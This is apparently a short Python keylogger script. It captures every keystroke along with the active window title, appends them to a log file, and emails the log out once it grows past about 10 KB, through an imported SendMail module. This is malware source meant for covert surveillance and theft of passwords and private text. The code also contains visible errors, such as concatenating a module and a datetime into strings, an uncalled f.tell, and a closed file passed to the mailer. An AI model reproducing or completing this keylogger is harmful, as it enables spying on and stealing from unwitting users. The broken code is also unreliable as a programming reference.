import pynput
from pynput.keyboard import Key,Listener
import SendMail
import os
import win32gui
import datetime


count = 0
keys = []

def on_press(key):
    global keys, count
    # Get the window name while typing :
    w = win32gui
    w.GetWindowText(w.GetForegroundWindow())
    keys.append(str(key))
    count += 1
    if count > 10 :
        # every 10 keys will be added with name of the widow name date and time above them
        e = datetime.datetime.now()
        keys.append('At window: '+w+ ' ' +e+'\n') 
        count = 0
        write_file(keys)

def email(keys):
    message = ""
    for key in keys:
        k = key.replace("'","")
        if key == "Key.space":
            k = " "
        if key == "Key.capslock":
            k = ""
        if key == "Key.backspace":
            k = ""

        message += k
    SendMail.sendEmail(message)

def on_release(key):
    if key == Key.esc:
        return False
def write_file(keys):
    with open("log.txt","a") as f:
        for key in keys:
            f.write(key)
    f.seek(0, os.SEEK_END)
    if f.tell>10240:
        email(f)

with Listener(on_press = on_press, on_release = on_release) as listener:
    listener.join()